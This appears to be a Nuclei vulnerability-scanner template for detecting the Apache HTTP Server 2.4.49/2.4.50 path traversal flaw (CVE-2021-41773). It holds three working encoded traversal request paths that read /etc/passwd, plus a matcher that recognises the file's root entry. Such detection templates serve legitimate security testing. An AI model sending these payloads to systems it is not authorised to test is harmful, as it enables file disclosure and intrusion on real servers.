id: apache-path-traversal
info:
  name: "Apache 2.4.49/50 Path Traversal (CVE-2021-41773)"
  severity: critical
  description: "Detection du path traversal dans Apache HTTP Server 2.4.49 et 2.4.50."
  tags: cve,cve2021,apache,path-traversal,lfi,critical

http:
  - method: GET
    path:
      - "{{BaseURL}}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
      - "{{BaseURL}}/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
      - "{{BaseURL}}/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
    matchers:
      - type: regex
        regex:
          - "root:.*:0:0:"
      - type: status
        status:
          - 200
    matchers-condition: and
